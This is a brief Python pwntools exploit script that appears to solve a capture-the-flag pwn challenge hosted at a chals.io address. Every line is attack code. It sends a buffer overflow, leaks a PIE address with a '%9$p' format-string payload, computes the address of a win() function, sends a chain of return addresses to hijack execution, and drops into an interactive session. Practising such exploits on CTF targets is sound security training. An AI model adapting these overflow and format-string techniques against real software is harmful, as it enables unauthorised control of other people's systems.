from pwn import *

p = remote("spaceheroes-pwnschool.chals.io", 443, ssl=True, sni="spaceheroes-pwnschool.chals.io")
p.recvuntil(b'>>> ')
p.sendline(b'1')
p.recvuntil(b'>>> ')

# Overflowing the buffer in Step 1
p.sendline(cyclic(17))
p.recvuntil(b'>>> ')
p.sendline(b'2')
p.recvuntil(b'>>> ')

# Leaking the PIE address in Step 2
p.sendline(b'%9$p')
p.recvuntil(b' = ')
p.recvuntil(b' = ')
leak = int(p.recvline().strip(), 16)
p.recvuntil(b'>>> ')
p.sendline(b'3')
p.recvuntil(b'win(): ')
win_off = int(p.recvline().strip(), 16)

# Calculating win address in Step 3
win = leak + win_off
# Sometimes we need returns to line everything up
ret = win - 1
print(hex(win))
p.recvuntil(b'>>> ')
p.sendline(hex(win))
p.recvuntil(b'>>> ')
p.sendline(b'4')
p.recvuntil(b'>>> ')

# Sending a bunch of returns to line up and overflow, then the address of win.
p.sendline(p64(ret) * 6 + p64(win))

p.interactive()
